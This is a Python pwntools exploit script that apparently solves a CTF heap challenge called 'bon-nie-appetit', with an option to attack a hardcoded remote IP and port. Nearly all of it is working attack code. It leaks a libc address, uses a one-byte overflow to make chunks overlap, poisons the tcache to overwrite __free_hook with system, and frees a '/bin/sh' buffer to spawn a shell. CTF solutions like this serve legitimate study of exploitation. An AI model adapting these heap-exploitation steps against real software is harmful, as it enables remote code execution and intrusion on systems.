#!/usr/bin/env python3

from pwn import *

the_binary = "./bon-nie-appetit"
context.binary = the_binary
elf = context.binary
libc = ELF("./glibc/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("167.172.56.180", 31295)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def choice(num):
    io.sendlineafter(b"> ", str(num).encode())

def index(idx):
    io.sendafter(b"Number of order: ", str(idx).encode())

def alloc(data, sz=None):
    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz

    choice(1)
    io.sendafter(b"how many: ", str(sz).encode())
    io.sendafter(b"order: ", data)

def free(idx):
    choice(4)
    index(idx)

def show(idx):
    choice(2)
    index(idx)
    io.recvuntil(f"Order[{idx}] => ".encode())
    return io.recvuntil(b" \n", drop=True)

def edit(idx, new_data):
    choice(3)
    index(idx)
    io.sendafter(b"order: ", new_data)

# We pick a size in the tcache range but outside of the fastbin range,
# so we can force allocations in the unsortedbin.
small_sz = 0x28
big_sz = 0x58

# Link libc pointers into a chunk by freeing it.
alloc(b"x", sz=0x1000)
alloc(b"x", sz=0x10)
free(0)

# Leak libc pointers by allocating the same chunk and printing it.
# Chunk data is not sanitized so the unsortedbin pointers remain
# in its user data section.
alloc(b"x", sz=0x1000)
libc_leak = u64(show(0).ljust(8, b"\x00"))
libc.address = libc_leak - 0x3ebc78
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)
free(0)
free(1)

# Make some smaller chunks in one tcache bin.
for i in range(6):
    alloc(str(i).encode()*small_sz)

# One-byte next chunk sz overflow. Chunk 2 now overlaps Chunk 3.
edit(1, b"z"*small_sz + p8(0x61))

# Free the larger overlapping chunk.
free(2)

# Free the inner overlapped chunk.
free(3)

# Allocate data over the tcache fd pointer of the overlapped inner chunk.
log.info("Using __free_hook address of %#x" % libc.sym.__free_hook)
alloc(b"A"*0x28 + p64(0x31) + p64(libc.sym.__free_hook), sz=big_sz)

# Allocate two smaller chunks, the second of which will be allocated over
# __free_hook.
alloc(b"/bin/sh\x00", sz=small_sz)
alloc(p64(libc.sym.system), sz=small_sz)

# Trigger a free of "/bin/sh" and pop a shell.
free(3)

io.interactive()
